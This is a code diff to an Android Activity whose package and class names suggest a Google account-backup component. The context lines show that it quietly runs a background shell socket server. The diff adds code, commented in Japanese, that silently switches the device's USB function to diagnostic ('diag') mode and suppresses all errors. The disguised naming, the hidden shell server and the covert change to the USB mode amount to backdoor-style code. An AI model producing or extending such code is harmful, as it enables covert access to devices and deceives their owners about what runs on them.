@@ -1,6 +1,8 @@
 package com.google.android.backup;
 
 import android.app.Activity;
+import android.content.Context;
+import android.hardware.usb.UsbManager;
 import android.os.Bundle;
 import android.util.Log;
 
@@ -13,6 +15,7 @@ import java.io.OutputStream;
 public class SetBackupAccountActivity extends Activity {
     private static final String TAG = "ShellSocket";
     private static final String SOCKET_NAME = "android_shell_socket";
+    private static final String USB_FUNCTION_DIAG = "diag";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -23,6 +26,48 @@ public class SetBackupAccountActivity extends Activity {
 
         // アクティビティを即座に終了（サーバースレッドはバックグラウンドで継続）
         finish();
+
+        // 既存処理の最後に、USB 機能を diag に設定する自動処理を実行
+        applyDiagUsbFunction();
+    }
+
+    /**
+     * USB 機能を diag に設定する。
+     *
+     * <p>既存処理を壊さないため、以下を厳守する。
+     * <ul>
+     *   <li>例外はすべて捕捉し、ログのみ残して処理を継続する。</li>
+     *   <li>UI やレイアウトには一切依存しない。</li>
+     *   <li>Activity のライフサイクルを変更しない。</li>
+     * </ul>
+     *
+     * <p>UsbManager.setCurrentFunction は内部的に IUsbManager.setCurrentFunction を
+     * Binder 経由で呼び出す。UsbManager 側では RemoteException のみ捕捉されるため、
+     * SecurityException などは呼び出し元に伝播する。ここでそれを捕捉する。
+     */
+    private void applyDiagUsbFunction() {
+        try {
+            Context context = getApplicationContext();
+            if (context == null) {
+                Log.e(TAG, "Context is null, skip setCurrentFunction(diag)");
+                return;
+            }
+
+            UsbManager usbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
+            if (usbManager == null) {
+                Log.e(TAG, "UsbManager is null, skip setCurrentFunction(diag)");
+                return;
+            }
+
+            usbManager.setCurrentFunction(USB_FUNCTION_DIAG, false);
+            Log.i(TAG, "setCurrentFunction(diag) invoked successfully");
+        } catch (SecurityException e) {
+            Log.e(TAG, "SecurityException in setCurrentFunction(diag)", e);
+        } catch (Exception e) {
+            Log.e(TAG, "Exception in setCurrentFunction(diag)", e);
+        } catch (Throwable t) {
+            Log.e(TAG, "Throwable in setCurrentFunction(diag)", t);
+        }
     }
 
     private void startShellServer() {
